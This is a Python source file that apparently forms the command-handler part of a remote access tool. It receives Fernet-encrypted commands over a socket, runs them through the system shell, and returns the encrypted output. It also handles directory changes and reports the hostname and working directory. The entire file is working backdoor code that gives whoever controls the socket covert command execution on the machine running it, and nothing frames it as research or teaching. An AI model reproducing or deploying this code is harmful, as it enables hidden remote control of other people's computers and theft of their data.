from os import chdir, path, getcwd
import socket
from select import select
from time import sleep
from cryptography.fernet import Fernet
from subprocess import check_output, STDOUT


def _decrypt_fs(data: bytes | str, key: bytes) -> bytes:
    if not isinstance(data, bytes):
        data = str(data).encode()
    if data:
        fernet = Fernet(key)
        return fernet.decrypt(data)
    raise AttributeError


def _encrypt_fs(data: bytes | str, key: bytes) -> bytes:
    if not isinstance(data, bytes):
        data = str(data).encode()
    if data:
        fernet = Fernet(key)
        return fernet.encrypt(data)
    raise AttributeError


def shell_rn(conn: socket.socket, key: bytes) -> None:
    conn.settimeout(600)
    while True:
        try:
            command = _decrypt_fs(conn.recv(1024), key).decode().strip()
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
            break
        except Exception:
            continue
        if command == "GTINFO":
            conn.sendall(_encrypt_fs(f"{socket.gethostname()}[{getcwd()}]", key))
        elif "END" in command:
            break
        elif command.startswith("cd"):
            parts = command.split(" ", 1)
            if len(parts) == 1:
                conn.sendall(_encrypt_fs("So where?", key))
            else:
                try:
                    chdir(parts[1].strip())
                    conn.sendall(_encrypt_fs("None", key))
                except Exception:
                    conn.sendall(_encrypt_fs(f"cd: {parts[1].strip()}: No such file or directory", key))
        else:
            if "bash" in command:
                conn.sendall(_encrypt_fs("What do you want from me ?!", key))
            else:
                try:
                    out = check_output(command, stderr=STDOUT, shell=True)
                except Exception as e:
                    out = e
                try:
                    conn.sendall(_encrypt_fs(out, key))
                except Exception:
                    conn.sendall(_encrypt_fs("None", key))


def command_runner(conn: socket.socket, command: str, key: bytes) -> None:
    while True:
        sleep(0.25)
        try:
            if command == "RMCM":
                shell_rn(conn, key)
                conn.send(b"END")
                break
            else:
                break
        except Exception:
            break